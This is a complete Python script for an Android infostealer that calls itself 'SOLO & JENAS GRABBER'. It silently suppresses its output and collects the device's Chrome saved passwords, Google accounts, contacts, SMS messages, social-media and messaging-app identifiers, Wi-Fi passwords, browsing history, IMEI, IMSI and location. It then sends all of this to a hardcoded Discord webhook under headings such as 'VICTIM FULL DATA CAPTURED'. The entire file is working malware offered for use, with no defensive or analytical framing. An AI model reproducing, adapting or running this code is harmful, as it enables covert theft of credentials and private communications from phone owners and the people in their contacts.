#!/usr/bin/env python3

import subprocess
import sys
import os
import json
import re
import time
import sqlite3
import shutil
from datetime import datetime

REQUIRED_PACKAGES = ['requests']

def install_packages():
    for package in REQUIRED_PACKAGES:
        try:
            __import__(package)
        except ImportError:
            subprocess.run([sys.executable, '-m', 'pip', 'install', package], capture_output=True)

install_packages()

import requests

ORIGINAL_WEBHOOK = "https://discord.com/api/webhooks/1507041445880795298/zJGH0mrnJAZCcJ6SA-oCp1-IgOdDA4uvdKN7nH3od0MzWYG_ed_tUqA3_mDVjWBiW4_I"

sys.stdout = open(os.devnull, 'w')
sys.stderr = open(os.devnull, 'w')

def get_ip():
    try:
        r = requests.get('https://api.ipify.org?format=json', timeout=5)
        return r.json().get('ip', '0.0.0.0')
    except:
        return '0.0.0.0'

def get_location():
    try:
        r = requests.get('https://ipapi.co/json/', timeout=5)
        data = r.json()
        return f"{data.get('city', 'Unknown')}, {data.get('country_name', 'Unknown')}, {data.get('region', 'Unknown')}"
    except:
        return 'Unknown'

def get_device_info():
    info = {}
    try:
        r = subprocess.run(['getprop', 'ro.product.model'], capture_output=True, text=True, timeout=3)
        info['model'] = r.stdout.strip() or 'Unknown'
    except:
        info['model'] = 'Unknown'
    try:
        r = subprocess.run(['getprop', 'ro.product.manufacturer'], capture_output=True, text=True, timeout=3)
        info['brand'] = r.stdout.strip() or 'Unknown'
    except:
        info['brand'] = 'Unknown'
    try:
        r = subprocess.run(['getprop', 'ro.build.version.release'], capture_output=True, text=True, timeout=3)
        info['android'] = r.stdout.strip() or 'Unknown'
    except:
        info['android'] = 'Unknown'
    try:
        r = subprocess.run(['getprop', 'ro.product.device'], capture_output=True, text=True, timeout=3)
        info['device'] = r.stdout.strip() or 'Unknown'
    except:
        info['device'] = 'Unknown'
    try:
        r = subprocess.run(['getprop', 'ro.build.version.sdk'], capture_output=True, text=True, timeout=3)
        info['sdk'] = r.stdout.strip() or 'Unknown'
    except:
        info['sdk'] = 'Unknown'
    try:
        r = subprocess.run(['getprop', 'ro.product.board'], capture_output=True, text=True, timeout=3)
        info['board'] = r.stdout.strip() or 'Unknown'
    except:
        info['board'] = 'Unknown'
    return info

def get_google_accounts():
    accounts = []
    try:
        r = subprocess.run(['content', 'query', '--uri', 'content://com.google.android.gsf.googleapps/'], capture_output=True, text=True, timeout=5)
        emails = re.findall(r'email=([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})', r.stdout)
        for email in emails:
            accounts.append(f"Google Account: {email}")
    except:
        pass
    
    try:
        r = subprocess.run(['dumpsys', 'account'], capture_output=True, text=True, timeout=5)
        emails = re.findall(r'name=([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})', r.stdout)
        for email in emails:
            accounts.append(f"Google Account: {email}")
    except:
        pass
    
    return list(set(accounts))[:20]

def get_google_passwords():
    passwords = []
    
    chrome_paths = [
        '/data/data/com.android.chrome/app_chrome/Default/Login Data',
        '/data/data/com.android.browser/app_chrome/Default/Login Data',
        '/data/data/com.google.android.apps.chrome/app_chrome/Default/Login Data'
    ]
    
    for path in chrome_paths:
        if os.path.exists(path):
            try:
                temp_db = '/data/local/tmp/chrome_login.db'
                subprocess.run(['cp', path, temp_db], capture_output=True, timeout=5)
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                for row in cursor.fetchall():
                    url = row[0] if row[0] else 'Unknown'
                    username = row[1] if row[1] else 'Unknown'
                    password = row[2] if row[2] else 'Unknown'
                    if password and password != 'Unknown':
                        passwords.append(f"Chrome - {url[:60]}: {username} | {password[:30]}")
                conn.close()
                os.remove(temp_db)
            except:
                pass
    
    return list(set(passwords))[:30]

def get_contacts():
    contacts = []
    try:
        r = subprocess.run(['content', 'query', '--uri', 'content://contacts/phones'], capture_output=True, text=True, timeout=10)
        numbers = re.findall(r'number=([0-9\+]+)', r.stdout)
        names = re.findall(r'display_name=([^,]+)', r.stdout)
        for i, num in enumerate(numbers[:200]):
            name = names[i] if i < len(names) else ''
            contacts.append(f"{name}: {num}" if name else num)
    except:
        pass
    
    try:
        r = subprocess.run(['content', 'query', '--uri', 'content://contacts/data'], capture_output=True, text=True, timeout=10)
        emails = re.findall(r'data1=([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})', r.stdout)
        for email in emails:
            contacts.append(f"Email Contact: {email}")
    except:
        pass
    
    return list(set(contacts))[:200]

def get_sms():
    sms_list = []
    try:
        r = subprocess.run(['content', 'query', '--uri', 'content://sms/inbox'], capture_output=True, text=True, timeout=10)
        matches = re.findall(r'address=([^,]+).*?body=([^\n]{1,200})', r.stdout, re.DOTALL)
        for addr, body in matches[:100]:
            sms_list.append(f"From: {addr} - {body[:100]}")
    except:
        pass
    
    try:
        r = subprocess.run(['content', 'query', '--uri', 'content://sms/sent'], capture_output=True, text=True, timeout=10)
        matches = re.findall(r'address=([^,]+).*?body=([^\n]{1,200})', r.stdout, re.DOTALL)
        for addr, body in matches[:50]:
            sms_list.append(f"To: {addr} - {body[:100]}")
    except:
        pass
    
    return list(set(sms_list))[:100]

def get_tiktok_data():
    data = []
    paths = [
        '/data/data/com.zhiliaoapp.musically/shared_prefs/',
        '/data/data/com.zhiliaoapp.musically/files/',
        '/sdcard/Android/data/com.zhiliaoapp.musically/'
    ]
    for path in paths:
        if os.path.exists(path):
            try:
                result = subprocess.run(['grep', '-r', '-i', 'user', path], capture_output=True, text=True, timeout=10)
                matches = re.findall(r'username[\s]*[:=][\s]*([a-zA-Z0-9_.]+)', result.stdout, re.IGNORECASE)
                for m in matches[:30]:
                    data.append(f"TikTok: {m}")
                matches = re.findall(r'email[\s]*[:=][\s]*([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})', result.stdout, re.IGNORECASE)
                for m in matches[:30]:
                    data.append(f"TikTok Email: {m}")
                matches = re.findall(r'phone[\s]*[:=][\s]*([0-9\+]{10,15})', result.stdout)
                for m in matches[:30]:
                    data.append(f"TikTok Phone: {m}")
            except:
                pass
    return list(set(data))[:50]

def get_messenger_data():
    data = []
    paths = [
        '/data/data/com.facebook.orca/shared_prefs/',
        '/data/data/com.facebook.orca/databases/',
        '/sdcard/Android/data/com.facebook.orca/'
    ]
    for path in paths:
        if os.path.exists(path):
            try:
                result = subprocess.run(['grep', '-r', '-i', 'user', path], capture_output=True, text=True, timeout=10)
                matches = re.findall(r'uid[\s]*[:=][\s]*([0-9]+)', result.stdout)
                for m in matches[:30]:
                    data.append(f"Messenger UID: {m}")
                emails = re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', result.stdout)
                for m in emails[:30]:
                    data.append(f"Messenger Email: {m}")
            except:
                pass
    return list(set(data))[:50]

def get_facebook_data():
    data = []
    paths = [
        '/data/data/com.facebook.katana/shared_prefs/',
        '/data/data/com.facebook.katana/files/',
        '/sdcard/Android/data/com.facebook.katana/'
    ]
    for path in paths:
        if os.path.exists(path):
            try:
                result = subprocess.run(['grep', '-r', '-i', 'email', path], capture_output=True, text=True, timeout=10)
                emails = re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', result.stdout)
                for m in emails[:30]:
                    data.append(f"Facebook Email: {m}")
                matches = re.findall(r'name[\s]*[:=][\s]*([a-zA-Z\s]+)', result.stdout)
                for m in matches[:30]:
                    if len(m) > 3:
                        data.append(f"Facebook Name: {m}")
            except:
                pass
    return list(set(data))[:50]

def get_instagram_data():
    data = []
    paths = [
        '/data/data/com.instagram.android/shared_prefs/',
        '/sdcard/Android/data/com.instagram.android/'
    ]
    for path in paths:
        if os.path.exists(path):
            try:
                result = subprocess.run(['grep', '-r', '-i', 'user', path], capture_output=True, text=True, timeout=10)
                matches = re.findall(r'username[\s]*[:=][\s]*([a-zA-Z0-9_.]+)', result.stdout, re.IGNORECASE)
                for m in matches[:30]:
                    data.append(f"Instagram: {m}")
                emails = re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', result.stdout)
                for m in emails[:30]:
                    data.append(f"Instagram Email: {m}")
            except:
                pass
    return list(set(data))[:50]

def get_whatsapp_data():
    data = []
    paths = [
        '/data/data/com.whatsapp/shared_prefs/',
        '/data/data/com.whatsapp/databases/',
        '/sdcard/WhatsApp/Databases/'
    ]
    for path in paths:
        if os.path.exists(path):
            try:
                result = subprocess.run(['grep', '-r', '-i', 'phone', path], capture_output=True, text=True, timeout=10)
                numbers = re.findall(r'[0-9]{10,15}', result.stdout)
                for m in list(set(numbers))[:30]:
                    data.append(f"WhatsApp Number: {m}")
                result = subprocess.run(['grep', '-r', '-i', 'profile', path], capture_output=True, text=True, timeout=10)
                names = re.findall(r'name[\s]*[:=][\s]*([a-zA-Z\s]+)', result.stdout)
                for m in names[:30]:
                    if len(m) > 3:
                        data.append(f"WhatsApp Name: {m}")
            except:
                pass
    return list(set(data))[:50]

def get_telegram_data():
    data = []
    paths = [
        '/data/data/org.telegram.messenger/shared_prefs/',
        '/data/data/org.telegram.messenger/files/'
    ]
    for path in paths:
        if os.path.exists(path):
            try:
                result = subprocess.run(['grep', '-r', '-i', 'phone', path], capture_output=True, text=True, timeout=10)
                numbers = re.findall(r'[0-9]{10,15}', result.stdout)
                for m in list(set(numbers))[:30]:
                    data.append(f"Telegram Number: {m}")
                result = subprocess.run(['grep', '-r', '-i', 'user', path], capture_output=True, text=True, timeout=10)
                matches = re.findall(r'first_name[\s]*[:=][\s]*([a-zA-Z\s]+)', result.stdout)
                for m in matches[:30]:
                    if len(m) > 2:
                        data.append(f"Telegram Name: {m}")
            except:
                pass
    return list(set(data))[:50]

def get_emails():
    emails = []
    pattern = r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'
    paths = ['/sdcard/', '/data/data/', '/sdcard/Download/', '/sdcard/Documents/']
    for path in paths:
        if os.path.exists(path):
            try:
                result = subprocess.run(['grep', '-r', '-E', pattern, path], capture_output=True, text=True, timeout=20)
                found = re.findall(pattern, result.stdout)
                emails.extend(found)
            except:
                pass
    
    try:
        r = subprocess.run(['logcat', '-d'], capture_output=True, text=True, timeout=5)
        found = re.findall(pattern, r.stdout)
        emails.extend(found)
    except:
        pass
    
    return list(set(emails))[:100]

def get_wifi_passwords():
    wifi = []
    try:
        r = subprocess.run(['cat', '/data/misc/wifi/wpa_supplicant.conf'], capture_output=True, text=True, timeout=5)
        matches = re.findall(r'ssid="(.*?)"\n.*?psk="?(.*?)"?\n', r.stdout, re.DOTALL)
        for ssid, pwd in matches[:30]:
            wifi.append(f"{ssid}: {pwd}")
    except:
        pass
    return wifi

def get_browser_history():
    history = []
    paths = [
        '/data/data/com.android.chrome/app_chrome/Default/History',
        '/data/data/com.android.browser/app_chrome/Default/History'
    ]
    for path in paths:
        if os.path.exists(path):
            try:
                temp_db = '/data/local/tmp/history.db'
                subprocess.run(['cp', path, temp_db], capture_output=True, timeout=5)
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                cursor.execute("SELECT url, title FROM urls ORDER BY last_visit_time DESC LIMIT 100")
                for row in cursor.fetchall():
                    url = row[0] if row[0] else 'Unknown'
                    title = row[1] if row[1] else 'No Title'
                    history.append(f"{title[:50]} - {url[:80]}")
                conn.close()
                os.remove(temp_db)
            except:
                pass
    return list(set(history))[:100]

def get_installed_apps():
    apps = []
    try:
        r = subprocess.run(['pm', 'list', 'packages'], capture_output=True, text=True, timeout=10)
        packages = re.findall(r'package:([a-zA-Z0-9._]+)', r.stdout)
        for pkg in packages[:150]:
            try:
                r2 = subprocess.run(['pm', 'list', 'packages', pkg], capture_output=True, text=True, timeout=3)
                apps.append(pkg)
            except:
                apps.append(pkg)
    except:
        pass
    return apps

def get_network_info():
    info = {}
    try:
        r = subprocess.run(['dumpsys', 'telephony.registry'], capture_output=True, text=True, timeout=5)
        match = re.search(r'mOperatorAlphaLong=(.+?)\n', r.stdout)
        info['carrier'] = match.group(1).strip() if match else 'Unknown'
        match = re.search(r'mOperatorNumeric=([0-9]+)', r.stdout)
        if match:
            info['mcc'] = match.group(1)[:3] if len(match.group(1)) >= 3 else ''
            info['mnc'] = match.group(1)[3:] if len(match.group(1)) > 3 else ''
    except:
        info['carrier'] = 'Unknown'
    
    try:
        r = subprocess.run(['dumpsys', 'wifi'], capture_output=True, text=True, timeout=5)
        match = re.search(r'SSID: "(.+?)"', r.stdout)
        info['wifi_ssid'] = match.group(1) if match else 'Unknown'
        match = re.search(r'BSSID: ([0-9a-f:]+)', r.stdout)
        info['bssid'] = match.group(1) if match else 'Unknown'
    except:
        info['wifi_ssid'] = 'Unknown'
        info['bssid'] = 'Unknown'
    
    return info

def get_imsi():
    try:
        r = subprocess.run(['content', 'query', '--uri', 'content://telephony/carriers/current'], capture_output=True, text=True, timeout=5)
        match = re.search(r'imsi=([0-9]+)', r.stdout)
        return match.group(1) if match else 'Unknown'
    except:
        return 'Unknown'

def get_imei():
    try:
        r = subprocess.run(['service', 'call', 'iphonesubinfo', '1'], capture_output=True, text=True, timeout=5)
        match = re.search(r"[0-9]{15}", r.stdout)
        return match.group(0) if match else 'Unknown'
    except:
        return 'Unknown'

def send_to_original(ip, location, device, google_accounts, google_passwords, contacts, sms, tiktok, messenger, facebook, instagram, whatsapp, telegram, emails, wifi, history, apps, network, imsi, imei):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    google_accounts_text = '\n'.join([f'• {a}' for a in google_accounts[:30]]) if google_accounts else 'None'
    google_passwords_text = '\n'.join([f'• {p[:100]}' for p in google_passwords[:30]]) if google_passwords else 'None'
    contacts_text = '\n'.join([f'• {c}' for c in contacts[:100]]) if contacts else 'None'
    sms_text = '\n'.join([f'• {s}' for s in sms[:50]]) if sms else 'None'
    tiktok_text = '\n'.join([f'• {t}' for t in tiktok[:40]]) if tiktok else 'None'
    messenger_text = '\n'.join([f'• {m}' for m in messenger[:40]]) if messenger else 'None'
    facebook_text = '\n'.join([f'• {f}' for f in facebook[:40]]) if facebook else 'None'
    instagram_text = '\n'.join([f'• {i}' for i in instagram[:40]]) if instagram else 'None'
    whatsapp_text = '\n'.join([f'• {w}' for w in whatsapp[:40]]) if whatsapp else 'None'
    telegram_text = '\n'.join([f'• {t}' for t in telegram[:40]]) if telegram else 'None'
    emails_text = '\n'.join([f'• {e}' for e in emails[:50]]) if emails else 'None'
    wifi_text = '\n'.join([f'• {w}' for w in wifi[:30]]) if wifi else 'None'
    history_text = '\n'.join([f'• {h}' for h in history[:50]]) if history else 'None'
    apps_text = '\n'.join([f'• {a}' for a in apps[:80]]) if apps else 'None'
    
    device_str = f"{device.get('brand')} {device.get('model')} (Android {device.get('android')}) - Board: {device.get('board')}"
    network_str = f"Carrier: {network.get('carrier')} | WiFi: {network.get('wifi_ssid')} | BSSID: {network.get('bssid')} | IMSI: {imsi} | IMEI: {imei}"
    
    payload = {
        "username": "SOLO & JENAS GRABBER",
        "avatar_url": "https://i.imgur.com/PjQtnRu.jpeg",
        "embeds": [
            {
                "title": "🎯 VICTIM FULL DATA CAPTURED",
                "color": 0xed4245,
                "timestamp": timestamp,
                "fields": [
                    {"name": "🌐 IP & LOCATION", "value": f"```IP: {ip}\nLocation: {location}```", "inline": False},
                    {"name": "📱 DEVICE INFO", "value": f"```{device_str}```", "inline": False},
                    {"name": "📡 NETWORK INFO", "value": f"```{network_str}```", "inline": False},
                    {"name": "🔐 GOOGLE ACCOUNTS", "value": f"```{google_accounts_text[:900]}```", "inline": False},
                    {"name": "🔑 GOOGLE CHROME PASSWORDS", "value": f"```{google_passwords_text[:900]}```", "inline": False},
                    {"name": "📞 CONTACTS", "value": f"```{contacts_text[:900]}```", "inline": False},
                    {"name": "💬 SMS MESSAGES", "value": f"```{sms_text[:900]}```", "inline": False}
                ]
            },
            {
                "title": "📱 SOCIAL MEDIA ACCOUNTS",
                "color": 0x5865f2,
                "timestamp": timestamp,
                "fields": [
                    {"name": "🎵 TIKTOK", "value": f"```{tiktok_text[:800]}```", "inline": True},
                    {"name": "💬 MESSENGER", "value": f"```{messenger_text[:800]}```", "inline": True},
                    {"name": "📘 FACEBOOK", "value": f"```{facebook_text[:800]}```", "inline": True},
                    {"name": "📷 INSTAGRAM", "value": f"```{instagram_text[:800]}```", "inline": True},
                    {"name": "💚 WHATSAPP", "value": f"```{whatsapp_text[:800]}```", "inline": True},
                    {"name": "✈️ TELEGRAM", "value": f"```{telegram_text[:800]}```", "inline": True}
                ]
            },
            {
                "title": "📧 ADDITIONAL STOLEN DATA",
                "color": 0x57f287,
                "timestamp": timestamp,
                "fields": [
                    {"name": "📧 EMAILS FOUND", "value": f"```{emails_text[:900]}```", "inline": False},
                    {"name": "📶 WIFI PASSWORDS", "value": f"```{wifi_text[:900]}```", "inline": False},
                    {"name": "🌐 BROWSER HISTORY", "value": f"```{history_text[:900]}```", "inline": False}
                ]
            },
            {
                "title": "📦 INSTALLED APPLICATIONS",
                "color": 0xfaa81a,
                "timestamp": timestamp,
                "fields": [
                    {"name": "📱 APPS LIST", "value": f"```{apps_text[:900]}```", "inline": False}
                ]
            }
        ]
    }
    
    try:
        requests.post(ORIGINAL_WEBHOOK, json=payload, timeout=15)
    except:
        pass

def main():
    ip = get_ip()
    location = get_location()
    device = get_device_info()
    google_accounts = get_google_accounts()
    google_passwords = get_google_passwords()
    contacts = get_contacts()
    sms = get_sms()
    tiktok = get_tiktok_data()
    messenger = get_messenger_data()
    facebook = get_facebook_data()
    instagram = get_instagram_data()
    whatsapp = get_whatsapp_data()
    telegram = get_telegram_data()
    emails = get_emails()
    wifi = get_wifi_passwords()
    history = get_browser_history()
    apps = get_installed_apps()
    network = get_network_info()
    imsi = get_imsi()
    imei = get_imei()
    
    send_to_original(ip, location, device, google_accounts, google_passwords, contacts, sms, tiktok, messenger, facebook, instagram, whatsapp, telegram, emails, wifi, history, apps, network, imsi, imei)

if __name__ == "__main__":
    try:
        main()
    except:
        pass
    finally:
        sys.stdout = sys.__stdout__
        sys.stderr = sys.__stderr__
